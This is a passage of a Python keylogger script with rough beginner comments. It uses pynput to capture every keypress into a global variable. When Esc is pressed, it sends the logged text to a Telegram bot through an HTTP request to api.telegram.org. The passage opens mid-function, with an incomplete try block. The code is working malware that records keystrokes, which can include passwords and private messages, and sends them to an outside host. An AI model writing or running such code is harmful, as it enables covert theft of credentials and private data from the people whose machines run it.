#its a function consume the presskey

    try:
        global text #use globol for access the global variable 
        
        #its not store the space b/w data and its also ignore the space key so if key is space the ' ' store the space

        print('Special key {} pressed'.format(key))
      
#create another function the contain the key as a parameter and its used also find which press key release by user
#but its main motive exit from the program 
def on_release(key):


    if key == Key.esc:#if the key ==Key.esc then the condition 

        print('\n\nStore data : ',text)#because the program is exit therefore print all press key data 
        
        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={text}')#also send the press key data to telegram bot for access the data is widely

        return False #return false for exit the program


#listener is function its dectect the press key and and also call to both of these function for pass the press key as an argument 
with Listener(on_press=on_press, on_release=on_release) as listener:#as listener is like an object @ if i am wrong then change its  
    print("Press 'Esc' to exit.")#print this for user help how exit with this program
    listener.join()#its work as like - its create a internally loop for call function
